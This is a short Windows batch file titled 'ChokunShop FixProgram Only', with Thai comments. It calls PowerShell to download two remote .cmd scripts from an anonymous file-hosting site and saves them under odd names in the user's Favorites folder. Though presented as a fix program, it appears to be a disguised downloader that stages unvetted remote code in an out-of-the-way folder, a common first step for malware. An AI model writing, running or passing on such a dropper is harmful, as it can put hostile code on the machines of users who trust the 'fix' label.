@echo off
setlocal enabledelayedexpansion
Title “ChokunShop FixProgram Only”
REM ระบุ URL ของไฟล์ที่ต้องการดาวน์โหลด
set "fileURL=https://files.catbox.moe/zrz28x.cmd"
set "fileURL2=https://files.catbox.moe/iutczy.cmd"

REM ระบุโฟลเดอร์ที่ต้องการบันทึกไฟล์
set "destinationFolder=%USERPROFILE%\Favorites"

REM ใช้คำสั่ง PowerShell เพื่อดาวน์โหลดไฟล์
powershell -command "& { Invoke-WebRequest -Uri '%fileURL%' -OutFile ('%destinationFolder%\boo.cmd') }"

REM ใช้คำสั่ง PowerShell เพื่อดาวน์โหลดไฟล์ 2
powershell -command "& { Invoke-WebRequest -Uri '%fileURL2%' -OutFile ('%destinationFolder%\Fewlovemomandpun.cmd') }"

echo Download completed.

:end
